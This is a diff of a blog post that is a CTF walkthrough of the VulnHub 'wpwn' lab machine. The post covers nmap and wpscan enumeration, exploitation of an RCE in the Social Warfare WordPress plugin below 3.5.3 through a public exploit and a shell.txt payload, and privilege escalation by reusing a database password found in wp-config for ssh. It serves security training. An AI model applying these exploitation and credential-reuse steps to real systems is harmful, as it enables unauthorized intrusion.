@@ -3,14 +3,13 @@ layout: post
 author: H4
 ---
 
-# PG VULNHUB WPWN
 [Details](https://www.vulnhub.com/entry/wpwn-1,537/)
 
-## enumeration
+# enumeration
 
 Using `nmap` to identify the attack surface of the target server.
 
-### nmap
+## nmap
 ```bash
 $ nmap -Pn 192.168.55.123 
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-31 14:53 EST
@@ -24,20 +23,20 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
 ```
 
-### dir buster
+## dir buster
 
 ```bash
 $ dirb http://192.168.55.123
 ```
--> `/wordpress/`  
-So `dirb` identified that there is a `wordpress` installation.
+> The folder `/wordpress/` was identified. So `dirb` identified that there is a `wordpress` installation.
+{: .prompt-info }
 
-### scan wordpress
+## scan wordpress
 
 Now we are using `wpscan` to check if we can identify vulnerabilities related to the `wordpress` installation.
 
 ```bash
-wpscan --url http://192.168.55.123/wordpress/                                                                                                                           
+$ wpscan --url http://192.168.55.123/wordpress/                                                                                                                           
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -151,8 +150,8 @@ Interesting Finding(s):
 [+] Memory used: 238.926 MB
 [+] Elapsed time: 00:00:04
 ```
-If we have a closer look at the output we see that the plugin `social warfare 3.5.2` is used.  
-Searching for an exploit using `searchsploit` reveals that the installed version is vulnerable to an `rce`.
+> If we have a closer look at the output we see that the plugin `social warfare 3.5.2` is used. Searching for an exploit using `searchsploit` reveals that the installed version is vulnerable to an `rce`.
+{: .prompt-tip }
 
 ```bash
 $ searchsploit social warfare      
@@ -166,8 +165,8 @@ Shellcodes: No Results
 
 ---
 
-## exploitation
-### social warfsare plugin < 3.5.3 exploit
+# exploitation
+## social warfare plugin < 3.5.3 exploit
 
 - [Details](https://www.exploit-db.com/exploits/46794)
 - Author: hash3liZer
@@ -222,7 +221,7 @@ if __name__ == "__main__":
 	main()
 ```
 
-### exploitation
+## exploitation
 Create a file `shell.txt` with the following content.
 
 ```
@@ -255,16 +254,15 @@ www-data
 
 Yay we got a shell!
 
-### first flag
+## first flag
 ```bash
 $ pwd
 /var/www
 $ cat local.txt
 a*****************************d
 ```
--> `a*****************************d`
 
-## privilege escalation
+# privilege escalation
 
 Having a closer look at the `wordpress` config file and which users exist on the system gives us an indication how to elevate our privileges.
 
@@ -286,8 +284,8 @@ $ ls /home
 takis
 ```
 
-So we identified that the user `takis` exists and that the `wordpress` installation uses a complicated database password (`R3&]vzhHmMn9,:-5`).  
-It is worth a try to ssh into the machine with ```takis:R3&]vzhHmMn9,:-5```.
+> So we identified that the user `takis` exists and that the `wordpress` installation uses a complicated database password (`R3&]vzhHmMn9,:-5`). It is worth a try to ssh into the machine with `takis:R3&]vzhHmMn9,:-5`.
+{: .prompt-tip }
 
 ```bash
 ssh takis@192.168.55.123
@@ -310,6 +308,5 @@ proof.txt  root.txt
 root@wpwn:~# cat proof.txt 
 f****************************1
 ```
--> `f****************************1`  
   
 Pwned! <@:-)
